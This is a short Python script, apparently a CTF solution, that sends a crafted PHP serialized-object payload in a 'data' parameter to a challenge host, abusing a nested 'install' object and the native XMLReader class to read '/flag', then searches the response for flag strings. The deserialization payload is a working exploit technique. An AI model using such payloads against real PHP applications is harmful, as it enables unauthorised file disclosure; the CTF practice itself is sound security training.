import requests
from bs4 import BeautifulSoup
import re

url = "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22XMLReader%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A1%3A%22c%22%3BN%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"

print("Fetching URL...")
response = requests.get(url, timeout=20)

print(f"Status: {response.status_code}")
print(f"Response length: {len(response.text)} chars\n")

# 查找所有可能的flag模式
flag_patterns = [
    r'flag\{[^}]+\}',
    r'FLAG\{[^}]+\}',
    r'ctf\{[^}]+\}',
    r'CTF\{[^}]+\}',
    r'[a-zA-Z0-9]{20,}',  # 长字符串可能是flag
]

print("="*70)
print("Searching for flags...")
print("="*70)

for pattern in flag_patterns:
    matches = re.findall(pattern, response.text, re.IGNORECASE)
    if matches:
        print(f"\nPattern '{pattern}' matches:")
        for match in matches[:10]:  # 只显示前10个匹配
            print(f"  - {match}")

# 保存完整响应
with open('f:\\CTF\\CTF-wp\\铸剑杯\\浅析PHP原生类\\response.html', 'w', encoding='utf-8') as f:
    f.write(response.text)
print("\n[+] Full response saved to response.html")

# 查看响应中"Hello,"之后的内容
if "Hello," in response.text:
    idx = response.text.index("Hello,")
    print(f"\n[*] Content after 'Hello,':")
    print(response.text[idx:idx+500])

print("\n" + "="*70)
print("Full response:")
print("="*70)
print(response.text)
